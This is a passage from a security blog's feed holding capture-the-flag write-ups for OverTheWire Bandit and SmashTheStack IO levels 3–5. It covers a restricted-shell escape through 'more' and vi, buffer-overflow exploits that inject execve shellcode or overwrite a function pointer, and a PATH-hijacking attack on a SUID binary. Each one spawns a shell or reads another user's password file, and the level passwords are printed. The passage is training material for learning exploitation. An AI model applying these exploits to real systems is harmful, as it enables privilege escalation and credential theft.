+<p>After reading a bit about how to find out another user&rsquo;s shell, what worked was looking in <code>/etc/passwd</code> for that specific user and checking the shell field (last one):</p>
+
+<p><code>plain
+cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+</code></p>
+
+<p>Cool, we have something! Let&rsquo;s look at it:</p>
+
+<p>``` plain
+bandit25@melinda:~$ cat /usr/bin/showtext</p>
+
+<h1>!/bin/sh</h1>
+
+<p>more ~/text.txt
+exit 0
+```</p>
+
+<p>So this shell uses <em>more</em> to display the contents of the text.txt file. Since <em>more</em> only displays one screen at a time, we want to see what else is contained in that file, but we don&rsquo;t have access to it, nor can we do anything about the shell. So the only way to proceed is to thoroughly read the <em>more</em> manpage and see if we can find something useful..</p>
+
+<p>So, apparently it&rsquo;s possible to start an editor from more, and that rang a bell because <em>vi</em> was listed among the commands that might be needed to solve this level. And then maybe we can see inside the file some more (see what I did there? xD)</p>
+
+<p>Since I wasn&rsquo;t sure how to proceed on the bandit system, I tested it on my own box first, by using <em>more</em> on a file large enough to activate it:</p>
+
+<p><img class="center" src="/images/overthewire/bandit/more.png" title="&lsquo;more&rsquo; &lsquo;more&rsquo;" ></p>
+
+<p>And pressing v dropped me into Vim!</p>
+
+<p><img class="center" src="/images/overthewire/bandit/vi.png" title="&lsquo;vi&rsquo; &lsquo;vi&rsquo;" ></p>
+
+<p>That gives a way to view the file beyond the first screen. But in the login shell, there was no interaction, I couldn&rsquo;t get <em>more</em> to step in..wouldn&rsquo;t even have known about it without checking the shell. But when I played around on my box some more, if using <em>more</em> on a very small file, it would just output its contents, the same way as <em>cat</em>, so there would be no indication that <em>more</em> was used to display it. Just like via SSH! So it means that text.txt file doesn&rsquo;t really have anything than that bandit ASCII art. But I wanted to check, and wasn&rsquo;t sure how to enter into the <em>more</em> prompt by logging in&hellip;it turns out that can be done by making the terminal window small!</p>
+
+<p><img class="center" src="/images/overthewire/bandit/small_more.png" title="&lsquo;small login for more&rsquo; &lsquo;small is more&rsquo;" ></p>
+
+<p><img class="center" src="/images/overthewire/bandit/more_shell.png" title="&lsquo;more&rsquo; &lsquo;more&rsquo;" ></p>
+
+<p>Bingo! From here we can drop in <em>vi</em>! But as expected, there is nothing else in the file. I admit I don&rsquo;t use <em>vi</em> and the few times I needed to use it for something I had to follow instructions by looking on the internet, so it took me a little more reading before I stumbled upon <a href="http://stackoverflow.com/questions/1169805/how-to-load-another-files-content-to-current-file-in-vim">this very useful SO post</a>. It&rsquo;s possible to read another file by inserting it into the current file! You can do this by typing <code>:r newfile</code>:</p>
+
+<p><img class="center" src="/images/overthewire/bandit/vi_read.png" title="&lsquo;vi read&rsquo; &lsquo;vi read&rsquo;" ></p>
+
+<p>Next I had to scroll through some warnings about multiple swap files, and at the end I saw the password inserted where the cursor was!</p>
+
+<p><img class="center" src="/images/overthewire/bandit/bandit26_pass.png" title="&lsquo;bandit 26 password&rsquo; &lsquo;bandit 26&rsquo;" ></p>
+
+<p>So the password is <em>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</em>, and this was a hell of a fun level to complete! :D</p>
+
+<p><strong>Useful command(s)</strong></p>
+
+<blockquote><p>The /etc/passwd file is a text file that describes user login accounts for the system.</p>
+
+<p> Each line of the file describes a single user, and contains seven colon-separated fields:</p>
+
+<p>name:password:UID:GID:GECOS:directory:shell</p>
+
+<p>shell       This is the program to run at login</p>
+
+<p>more is a filter for paging through text one screenful at a time. This version is especially primitive.</p>
+
+<p>Interactive commands for more are based on vi(1).</p>
+
+<p>v           Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is
+not defined, or defaults to &ldquo;vi&rdquo; if neither VISUAL nor EDITOR is defined.</p></blockquote>
+
+<h3>Level 26 &ndash;> Level 27</h3>
+
+<p>At this moment, level 27 does not exist yet.</p>
+
+<p>Ok, coming back to this was lots of fun, and 2 more levels have been added since I solved it the first time, so perhaps more will be added in the future as well. The bandit wargame has been one of my favorites, and level 26 was really interesting!</p>
+
+<p><img class="center" src="/images/overthewire/bandit/cookie.png" title="&lsquo;fortune cookie&rsquo; &lsquo;cookie&rsquo;" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 5]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5/"/>
+    <updated>2014-07-18T20:08:18+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/18/smashthestack-io-level-5</id>
+    <content type="html"><![CDATA[<p>This is another level with 2 alternate programs to exploit.</p>
+
+<!-- more -->
+
+
+<p>Code for level05.c:</p>
+
+<p>``` c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<p>int main(int argc, char **argv) {</p>
+
+<pre><code>char buf[128];
+
+if(argc &lt; 2) return 1;
+
+strcpy(buf, argv[1]);
+
+printf("%s\n", buf);    
+
+return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<p>This is a simple buffer overflow program. I will use the <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">x86 execve(&ldquo;/bin/sh&rdquo;)</a> shellcode and place it in an environment variable. Then I will get the address of that variable using an excellent program from Hacking: The Art of Exploitation and pass it to the level5 binary in order to get a shell.</p>
+
+<p>First, here is the very useful code for getting the address of an environment variable, from Jon Erickson&rsquo;s book:</p>
+
+<p>``` c</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<p>int main(int argc, char *argv[]) {</p>
+
+<pre><code>    char *ptr;
+    if(argc &lt; 3) {
+            printf("Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n", argv[0]);
+            exit(0);
+    }
+    ptr = getenv(argv[1]); /* Get env var location. */
+    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+    printf("%s will be at %p\n", argv[1], ptr);
+</code></pre>
+
+<p>}
+```</p>
+
+<p>Compile this program in your own directory. Next, add an environment variable with the shellcode:</p>
+
+<p><code>plain
+export PWN=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
+</code></p>
+
+<p>Next we need to find out the offsets for exploiting the program (again pattern_create.rb and pattern_offset.rb are your friends):</p>
+
+<p><code>plain
+root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+</code></p>
+
+<p>Run the program in GDB with the pattern and then get the offset:</p>
+
+<p>``` plain
+Program received signal SIGSEGV, Segmentation fault.
+0x37654136 in ?? ()</p>
+
+<p>root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 0x37654136
+[*] Exact match at offset 140
+```</p>
+
+<p>Now get the address of our environment variable:</p>
+
+<p><code>plain
+level5@io:/tmp/mydir$ ./getenv PWN /levels/level05
+PWN will be at 0xbfffff53
+</code></p>
+
+<p>Profit:</p>
+
+<p><code>plain
+level5@io:/tmp/mydir$ /levels/level05 $(python -c 'print "A" * 140 + "\x53\xff\xff\xbf"')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS���
+sh-4.2$ whoami
+level6
+sh-4.2$ cat /home/level6/.pass
+9BT8fmYDTPimXXhY3m
+</code></p>
+
+<p>This was the easy way. Prepare for worse in the alternate way, with level05_alt.c:</p>
+
+<p>``` c
+//don&rsquo;t get trapped, there&rsquo;s no need
+//level by bla</p>
+
+<h1>include &lt;sys/mman.h></h1>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<h1>define LOADERSIZE (232 + 16)</h1>
+
+<p>void<em> getASLRregion(int size, int flags);
+void switchcontext(char</em> newstack, char* code);</p>
+
+<p>int main(int argc, char<em> argv[], char</em> env[])
+{</p>
+
+<pre><code>char *newcode, *newstack;
+
+//allocate memory at random addresses
+newstack = getASLRregion(64 * 1024, PROT_READ | PROT_WRITE );
+newcode =  getASLRregion(64 * 1024, PROT_READ | PROT_WRITE | PROT_EXEC);
+
+if(argc &gt; 1)
+if(!strchr(argv[1], 0xcd))
+if(!strchr(argv[1], 0xe8))
+if(!strstr(argv[1], "\x0F\x34"))
+if(!strchr(argv[1], 0xdb)) {
+    //prepare new code section, leaving some space for a loader
+    strncpy(newcode + LOADERSIZE, argv[1], 1000);
+
+    //start executing using a new stack and code section.
+    switchcontext(newstack + 64 * 1024, newcode);
+}
+return 0;
+</code></pre>
+
+<p>}</p>
+
+<p>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>/
+/</em> HALT! The code below only provides a controllable aslr/noexec for this challenge, there&rsquo;s no need to waste time on it <em>/
+/</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/
+void <strong>attribute</strong>((constructor))initializePRNG(){int seed;FILE<em>devrand=fopen(&ldquo;/dev/random&rdquo;,&ldquo;r&rdquo;);if(devrand==0)exit(-1);
+if(fread(&amp;seed, 4, 1, devrand) != 1)exit(-1);fclose(devrand);srand(seed);}unsigned int loader[100]={0xe899c031,0};void</em>
+getASLRregion(int size, int flags){int tries=1000,hint,res;while(tries&mdash;){hint=rand()&lt;&lt;12;res=(int)mmap((void<em>)hint,size
++4096,flags,MAP_PRIVATE|MAP_ANONYMOUS,0,0);if(hint==res){loader[++loader[1]+1]=hint;return (void</em>)(res+(rand()&amp;0xffc));}
+if(munmap((void<em>)res,size+4096))exit(-1);}exit(-1);}void switchcontext(char</em>newstack,char<em>code){loader[1]&lt;&lt;=2;memcpy(code
+,loader,loader[1]+8);memcpy(code+loader[1]+8,&ldquo;\x68\x61\x70\x73\x00\x68\x6c\x66\x2f\x6d\x68\x63\x2f\x73\x65\x68\x2f\x70&rdquo;
+&ldquo;\x72\x6f\x89\xe3\x89\xc1\xb0\x05\xcd\x80\x81\xc4\x10\x00\x00\x00\x85\xc0\x0f\x88\x97\x00\x00\x00\x50\x89\xe5\x31\xc9\x31&rdquo;
+&ldquo;\xff\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x73\x00\x00\x00\x85\xc0\x0f\x84\x80\x00\x00\x00\x80\xf9\x2d\x74\x10\x80\xe9\x30&rdquo;
+&ldquo;\x80\xf9\x09\x76\xde\x80\xe9\x27\xe9\xd6\xff\xff\xff\x8b\x75\x04\xad\x39\xf8\x74\x3b\x85\xc0\x75\xf7\x57\x31\xc9\x31\xff&rdquo;
+&ldquo;\xc1\xe7\x04\x0f\xb6\xc9\x09\xcf\xe8\x38\x00\x00\x00\x85\xc0\x74\x49\x80\xf9\x20\x74\x10\x80\xe9\x30\x80\xf9\x09\x76\xe2&rdquo;
+&ldquo;\x80\xe9\x27\xe9\xda\xff\xff\xff\x5b\x89\xf9\x29\xd9\x31\xc0\x99\xb0\x7d\xcd\x80\xe8\x0e\x00\x00\x00\x85\xc0\x74\x1f\x80&rdquo;
+&ldquo;\xf9\x0a\x75\xf2\xe9\x7c\xff\xff\xff\x51\x89\xe1\x31\xc0\x99\xb0\x03\x42\x8b\x5d\x00\xcd\x80\x59\xc3\x31\xc0\x40\xcd\x80&rdquo;
+&ldquo;\x31\xc0\xb0\x06\x5b\xcd\x80\x31\xc0\x5b\x31\xc9\xb1\x10\xfd\x89\xe7\xf3\xab\xfc\x8d\x7b\xf8\xb1\x3d\x99\x31\xdb\x31\xf6&rdquo;
+&ldquo;\xf3\xab\x31\xff&rdquo;,LOADERSIZE-16);asm(&ldquo;mov %0, %%esp\nmov %1,%%eax\njmp </em>%%eax&rdquo;::&ldquo;r&rdquo;(newstack-4),&ldquo;r&rdquo;(code):&ldquo;eax&rdquo;);}
+```</p>
+
+<h4>Function overview</h4>
+
+<p>Well, let&rsquo;s first be clear on the flags used for the memory allocation:</p>
+
+<p>PROT_EXEC  Pages may be executed.</p>
+
+<p>PROT_READ  Pages may be read.</p>
+
+<p>PROT_WRITE Pages may be written.</p>
+
+<p><strong>strchr</strong></p>
+
+<p><em>char <em>strchr(const char </em>str, int ch);</em></p>
+
+<p>Returns a pointer to the first occurrence of character ch in str or a null pointer if no matching character is found.</p>
+
+<p>The terminating null byte is considered part of the string, so that if  ch  is  specified  as &lsquo;\0&rsquo;, this function returns a pointer to the terminator.</p>
+
+<p>I will come back to this at a later time.</p>
+
+<blockquote><p>Truth is the most valuable thing we have &mdash; so let us economize it.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 4]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/"/>
+    <updated>2014-07-07T22:24:52+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4</id>
+    <content type="html"><![CDATA[<p>We have source code for this level as well in level04.c:</p>
+
+<!-- more -->
+
+
+<p>``` c
+//writen by bla</p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;stdio.h></h1>
+
+<p>int main() {</p>
+
+<pre><code>    char username[1024];
+    FILE* f = popen("whoami","r");
+    fgets(username, sizeof(username), f);
+    printf("Welcome %s", username);
+
+    return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<h4>Function overview</h4>
+
+<p><strong>popen</strong></p>
+
+<p><em>FILE <em>popen(const char </em>command, const char *type);</em></p>
+
+<p>Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.</p>
+
+<p>The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter &lsquo;r&rsquo; for reading or the letter &lsquo;w&rsquo; for writing.  Since glibc 2.9, this argument can additionally include the letter &lsquo;e&rsquo;, which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.</p>
+
+<p>The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than <em>fclose(3)</em>.   Writing  to  such a stream writes to the standard input of the command; the command&rsquo;s standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a &ldquo;popened&rdquo;  stream  reads  the  command&rsquo;s standard output, and the command&rsquo;s standard input is the same as that of the process that called popen().</p>
+
+<p>Note that output popen() streams are fully buffered by default.</p>
+
+<p>The popen() function returns NULL if the <em>fork(2)</em> or <em>pipe(2)</em> calls fail, or if it cannot allocate memory.</p>
+
+<p>The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.</p>
+
+<p>Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command&rsquo;s input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().</p>
+
+<p>Failure  to  execute  the  shell  is indistinguishable from the shell&rsquo;s failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.</p>
+
+<p><strong>fgets</strong></p>
+
+<p><em>char <em>fgets(char </em>str, int num, FILE *stream);</em></p>
+
+<p>The <em>fgets()</em> function reads up to <em>num–1</em> characters from <em>stream</em> and stores them in the character array pointed to by <em>str</em>. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by <em>str</em>.</p>
+
+<p>On success, the function returns <em>str</em>.
+If the end-of-file is encountered while attempting to read a character, the eof indicator is set (<em>feof</em>). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of <em>str</em> remain unchanged).
+If a read error occurs, the error indicator (<em>ferror</em>) is set and a null pointer is also returned (but the contents pointed by <em>str</em> may have changed).</p>
+
+<h4>Program description</h4>
+
+<p>This program executes a shell command and prints the results. If we try to run it, we see this:</p>
+
+<p><code>plain
+level4@io:/levels$ ./level04
+Welcome level5
+</code></p>
+
+<p>This makes sense, since it&rsquo;s a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code></p>
+
+<p>We can&rsquo;t directly influence the program since it doesn&rsquo;t take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the <em>whoami</em> command. We can&rsquo;t put another command its place, but maybe we don&rsquo;t have to. How does the program know where to find whoami? Let&rsquo;s first find it ourselves:</p>
+
+<p><code>plain
+level4@io:/levels$ which whoami
+/usr/bin/whoami
+</code></p>
+
+<p>For this we have to understand the concept of PATH:</p>
+
+<blockquote><p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for
+executable files in response to commands issued by a user.
+Each user on a system can have a different PATH variable.</p>
+
+<p>(The Linux Information Project)</p></blockquote>
+
+<p>To see the contents of our PATH variable, we do this:</p>
+
+<p><code>plain
+level4@io:/levels$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:</p>
+
+<p>``` plain
+PATH=&ldquo;directory:$PATH&rdquo;</p>
+
+<p>PATH=$PATH:directory
+export PATH</p>
+
+<p>export PATH=$PATH:directory
+```</p>
+
+<p>Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let&rsquo;s do that now.</p>
+
+<p><code>plain
+level4@io:/levels$ mkdir /tmp/mydir
+level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" &gt; /tmp/mydir/whoami
+level4@io:/tmp/mydir$ ls -l whoami
+-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami
+</code></p>
+
+<p>If we leave it like this, the permissions won&rsquo;t allow it to be executed, so I make it readable, writable and executable for everyone with the following:</p>
+
+<p><code>plain
+chmod 777 whoami
+level4@io:/tmp/mydir$ ls -l whoami
+-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami
+</code></p>
+
+<p>Now add our directory to our PATH:</p>
+
+<p><code>plain
+level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
+level4@io:/tmp/mydir$ echo $PATH
+/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+</code></p>
+
+<p>All that&rsquo;s left is to run the level04 binary and collect the password:</p>
+
+<p><code>plain
+level4@io:/tmp/mydir$ /levels/level04
+Welcome KGpWsju2vDpmxcxlvm
+</code></p>
+
+<blockquote><p>Work consists of whatever a body is obliged to do.
+Play consists of whatever a body is not obliged to do.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SmashTheStack IO Level 3]]></title>
+    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/"/>
+    <updated>2014-07-07T21:37:07+03:00</updated>
+    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3</id>
+    <content type="html"><![CDATA[<p>This is the source code for level03.c:</p>
+
+<!-- more -->
+
+
+<p>``` c
+//bla, based on work by beach</p>
+
+<h1>include &lt;stdio.h></h1>
+
+<h1>include &lt;string.h></h1>
+
+<p>void good()
+{</p>
+
+<pre><code>    puts("Win.");
+    execl("/bin/sh", "sh", NULL);
+</code></pre>
+
+<p>}
+void bad()
+{</p>
+
+<pre><code>    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
+</code></pre>
+
+<p>}</p>
+
+<p>int main(int argc, char <strong>argv, char </strong>envp)
+{</p>
+
+<pre><code>    void (*functionpointer)(void) = bad;
+    char buffer[50];
+
+    if(argc != 2 || strlen(argv[1]) &lt; 4)
+            return 0;
+
+    memcpy(buffer, argv[1], strlen(argv[1]));
+    memset(buffer, 0, strlen(argv[1]) - 4);
+
+    printf("This is exciting we're going to %p\n", functionpointer);
+    functionpointer();
+
+    return 0;
+</code></pre>
+
+<p>}
+```</p>
+
+<h4>Function overview</h4>
+
+<p><strong>memcpy</strong></p>
+
+<p><em>void <em>memcpy(void </em>dest, const void *src, size_t n);</em></p>
+
+<p>Copies  <em>n</em> bytes from memory area <em>src</em> to memory area <em>dest</em>. The memory areas must not overlap.</p>
+
+<p>The function does not check for any terminating null character in <em>src</em>.</p>
+
+<p>Returns a pointer to <em>dest</em>.</p>
+
+<p><strong>memset</strong></p>
+
+<p><em>void <em>memset(void </em>buf, int value, size_t count);</em></p>
+
+<p><em>buf</em> = Pointer to the block of memory to fill.</p>
+
+<p><em>value</em> = Value to be set. The value is passed as an int, but the function fills the block of memory using the unsigned char conversion of this value.</p>
+
+<p><em>count</em> = Number of bytes to be set to the value.</p>
+
+<p>Sets the first <em>count</em> bytes of the block of memory pointed by <em>buf</em> to the specified <em>value</em></p>
+
+<p>Returns a pointer to the memory area <em>buf</em></p>
+
+<p>The most common use of <em>memset()</em> is to initialize a region of memory to some known value.</p>
+
+<h4>Program description</h4>
+
+<p>Running the program we see this:</p>
+
+<p><code>plain
+This is exciting we're going to 0x80484a4
+I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
+</code></p>
+
+<p>So we know the bad function address is at 0x80484a4 and the good function address is at 0x8048474. A function pointer is set to point to the address of the bad function. The program checks for an argument that is at least 4 in length. Then memset sets all except the last 4 bytes of the buffer to 0. There is a buffer overflow in how the program copies the argument to the buffer, without checking for boundaries. This will be key in exploiting the binary.</p>
+
+<p>I proceeded through feeding a string to the program that I created with <code>pattern_create.rb</code>. Then I ran the program with GDB:</p>
+
+<p><code>plain
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+</code></p>
+
+<p>So EIP points to some junk that I provided with the string. Let&rsquo;s check the offset:</p>
+
+<p><code>plain
+./pattern_offset.rb 0x63413563
+[*] Exact match at offset 76
+</code></p>
+
+<p>Excellent! Since we already have the address we need for the good function that will spawn us a shell, the next step is simple:</p>
+
+<p><code>plain
+level3@io:/levels$ ./level03 $(python -c 'print "A" * 76 + "\x74\x84\x04\x08"')
+This is exciting we're going to 0x8048474
+Win.
+sh-4.2$ whoami
+level4
+sh-4.2$ cat /home/level4/.pass
+9C4Jxjc3O3IjB7nXej
+</code></p>
+
+<p>We hijacked the execution flow and made EIP point to the address of the function we needed.</p>
+
+<blockquote><p>The surest protection against temptation is cowardice.</p>
+
+<p>&mdash; Mark Twain</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
